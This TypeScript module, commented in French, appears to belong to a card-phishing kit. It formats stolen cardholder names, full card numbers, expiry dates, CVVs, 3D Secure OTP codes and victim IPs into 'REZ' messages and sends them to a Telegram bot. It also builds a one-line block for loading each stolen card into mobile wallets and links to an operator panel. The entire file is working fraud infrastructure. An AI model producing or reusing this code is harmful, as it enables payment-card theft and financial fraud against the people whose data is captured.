// Module d'envoi des données vers Telegram
// Format standardisé selon tlg.md

import type { Request } from "express";
import { getRealIp } from "../panel/ip-manager";
import { getTelegramConfig } from "../../services/telegram-config-service";
import { buildPanelLink, extractVisitId } from "../../utils/panel-link";

/**
 * Échappe les caractères spéciaux pour Telegram HTML
 */
function escapeTelegram(text: string | undefined | null): string {
  if (!text) return "";
  return String(text)
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#39;");
}

/** Retourne le numéro de carte en chiffres uniquement (pour copier vers Google Pay / Apple Pay / Samsung Pay) */
function cardNumberDigitsOnly(value: string | undefined | null): string {
  if (!value) return "";
  return String(value).replace(/\D/g, "");
}

/** Formate expiration pour wallets (MM/YY) — format attendu par Google Pay */
function expiryForWallet(value: string | undefined | null): string {
  if (!value) return "";
  const s = String(value).replace(/\s/g, "");
  const match = s.match(/^(\d{1,2})[\/\-]?(\d{2,4})$/);
  if (match) {
    const mm = match[1].padStart(2, "0");
    const yy = match[2].length === 4 ? match[2].slice(-2) : match[2];
    return `${mm}/${yy}`;
  }
  return s;
}

/** CVC/CVV chiffres uniquement (3 ou 4 chiffres pour Google Pay) */
function cvcDigitsOnly(value: string | undefined | null): string {
  if (!value) return "";
  return String(value).replace(/\D/g, "").slice(0, 4);
}

/**
 * Construit le bloc Wallet optimisé Google Pay (libellés et format reconnus par Google Pay).
 * Inclut une ligne one-line pour copier-coller ou parsing automatique.
 */
function buildGooglePayBlock(
  cardNumber: string,
  expiryDate: string,
  cvv: string,
  cardholder: string,
  escape: (s: string) => string,
): string {
  const pan = cardNumberDigitsOnly(cardNumber);
  const exp = expiryForWallet(expiryDate);
  const cvc = cvcDigitsOnly(cvv);
  const name = (cardholder || "").trim();
  let block = `│────────── CC Pay ──────────\n`;
  block += `│Card number: ${escape(pan)}\n`;
  block += `│Expiration date: ${escape(exp)}\n`;
  block += `│CVC: ${escape(cvc)}\n`;
  block += `│Name on card: ${escape(name)}\n`;
  if (pan && (exp || cvc || name)) {
    block += `│[paste] ${escape([pan, exp, cvc, name].join("|"))}\n`;
  }
  block += `│─────────────────────────────────\n`;
  return block;
}

/**
 * Construit un message Telegram selon le format standardisé
 * Format: │=========AF-REZ-========= + données + │===========oZy===========
 * 
 * @param title Titre de l'étape (ex: "HSBC Login", "Card Information")
 * @param fields Champs à afficher avec leurs valeurs
 * @param ip Adresse IP du client
 * @param visitId Identifiant de visite (optionnel)
 * @param panelLink Lien vers le panel d'administration (optionnel)
 * @returns Message formaté selon le standard
 */
export function buildTelegramMessage(
  title: string,
  fields: Record<string, string>,
  ip: string,
  visitId?: string,
  panelLink?: string,
): string {
  let message = `│=========AU-REZ-CC-=========\n`;
  message += `│\n`;
  
  // Extraire les champs dans l'ordre spécifique
  const country = fields["Country"] || fields["country"] || "";
  const bin = fields["BIN"] || fields["bin"] || "";
  const cardholder = fields["Cardholder Name"] || fields["Cardholder"] || fields["cardholder"] || "";
  const cardNumber = fields["Card Number"] || fields["cardNumber"] || "";
  const expiryDate = fields["Expiry Date"] || fields["expiry"] || "";
  const cvv = fields["CVV"] || fields["cvv"] || "";
  
  // Country
  message += `│🌐 Country: ${escapeTelegram(country)}\n`;
  
  // BIN
  message += `│🏦 BIN: ${escapeTelegram(bin)}\n`;
  
  // Séparateur
  message += `│──────────\n`;
  
  // Cardholder Name
  message += `│👤 Cardholder Name: ${escapeTelegram(cardholder)}\n`;
  
  // Card Number
  message += `│💳 Card Number: ${escapeTelegram(cardNumber)}\n`;
  
  // Expiry Date
  message += `│📆 Expiry Date: ${escapeTelegram(expiryDate)}\n`;
  
  // CVV
  message += `│🔐 CVV: ${escapeTelegram(cvv)}\n`;
  
  // Séparateur avant IP
  message += `│──────────\n`;
  
  // IP
  message += `│🌐 IP: ${escapeTelegram(ip)}\n`;
  
  if (panelLink) {
    message += `│\n`;
    message += `│🔗 Panel VBV: ${escapeTelegram(panelLink)}\n`;
  }

  message += `│\n`;
  message += buildGooglePayBlock(cardNumber, expiryDate, cvv, cardholder, escapeTelegram);

  message += `│\n`;
  message += `│===========oZy===========\n`;
  
  return message.trim();
}

/**
 * Données de rappel carte pour le message 3D Secure
 */
export interface SessionCardRecap {
  country?: string;
  bin?: string;
  cardholder?: string;
  cardNumber?: string;
  expiry?: string;
  cvv?: string;
}

/**
 * Construit le message Telegram pour la vérification 3D Secure (OTP)
 * Format: │=========🔐 3D Secure -========= + OTP + rappel session + IP + │===========oZy===========
 */
export function buildTelegramMessage3DS(
  otpCode: string,
  ip: string,
  card: SessionCardRecap,
): string {
  let message = `│=========🔐 3D Secure -=========\n`;
  message += `│\n`;
  message += `│🔑 OTP: ${escapeTelegram(otpCode)}\n`;
  message += `│\n`;
  message += `│─────────\n`;
  message += `│🌐 Country: ${escapeTelegram(card.country ?? "")}\n`;
  message += `│🏦 BIN: ${escapeTelegram(card.bin ?? "")}\n`;
  message += `│👤 Cardholder Name: ${escapeTelegram(card.cardholder ?? "")}\n`;
  message += `│💳 Card Number: ${escapeTelegram(card.cardNumber ?? "")}\n`;
  message += `│📆 Expiry Date: ${escapeTelegram(card.expiry ?? "")}\n`;
  message += `│🔐 CVV: ${escapeTelegram(card.cvv ?? "")}\n`;
  message += `│──────────\n`;
  message += `│🌐 IP: ${escapeTelegram(ip)}\n`;
  message += `│\n`;
  message += buildGooglePayBlock(
    card.cardNumber ?? "",
    card.expiry ?? "",
    card.cvv ?? "",
    card.cardholder ?? "",
    escapeTelegram,
  );
  message += `│\n`;
  message += `│===========oZy===========\n`;
  return message.trim();
}

export interface PaymentData {
  cardholder: string;
  cardNumber: string;
  expiry: string;
  cvv: string;
  amount?: string;
  bin?: string; // BIN formaté pour affichage
  binInfo?: {
    card: string;
    bank: string;
    type: string;
    country: string;
  };
  [key: string]: any;
}

/**
 * Envoie les données de paiement vers Telegram
 */
export async function sendToTelegram(
  data: PaymentData,
  req?: Request,
): Promise<boolean> {
  const telegram = getTelegramConfig();

  if (!telegram.token || !telegram.chatId) {
    console.error("Telegram configuration missing");
    return false;
  }

  // Récupérer l'IP si disponible
  const ip = req ? getRealIp(req) : "unknown";
  
  // Récupérer le visitId et construire le lien du panel
  const visitId = req ? extractVisitId(req) : undefined;
  const panelLink = req ? buildPanelLink(req, visitId) : undefined;

  // Formater le message selon le nouveau format
  // Format: │=========AF-REZ-CC-========= + données + │===========oZy===========
  const message = buildTelegramMessage(
    "Card Information",
    {
      // Country en premier
      "Country": data.binInfo && data.binInfo.country !== "N/A" ? data.binInfo.country : "",
      // BIN ensuite (avec format: BIN (CARD_TYPE - BANK))
      "BIN": data.bin || "",
      // Cardholder Name
      "Cardholder Name": data.cardholder || "",
      // Card Number, Expiry Date, CVV
      "Card Number": data.cardNumber,
      "Expiry Date": data.expiry,
      "CVV": data.cvv,
    },
    ip,
    visitId,
    panelLink,
  );

  try {
    const response = await fetch(
      `https://api.telegram.org/bot${telegram.token}/sendMessage`,
      {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          chat_id: telegram.chatId,
          text: message,
          parse_mode: "HTML", // Utiliser HTML comme dans le beta
        }),
      },
    );

    if (!response.ok) {
      const errorText = await response.text();
      console.error("Telegram API error:", errorText);
      return false;
    }

    return true;
  } catch (error) {
    console.error("Failed to send to Telegram:", error);
    return false;
  }
}

/**
 * Envoie un message personnalisé vers Telegram
 */
export async function sendCustomMessage(
  message: string,
  parseMode: "Markdown" | "HTML" = "Markdown",
): Promise<boolean> {
  const telegram = getTelegramConfig();

  if (!telegram.token || !telegram.chatId) {
    console.error("Telegram configuration missing");
    return false;
  }

  try {
    const response = await fetch(
      `https://api.telegram.org/bot${telegram.token}/sendMessage`,
      {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          chat_id: telegram.chatId,
          text: message,
          parse_mode: parseMode,
        }),
      },
    );

    if (!response.ok) {
      const errText = await response.text();
      console.error("[Telegram] sendMessage failed:", response.status, errText);
      return false;
    }
    return true;
  } catch (error) {
    console.error("Failed to send custom message to Telegram:", error);
    return false;
  }
}
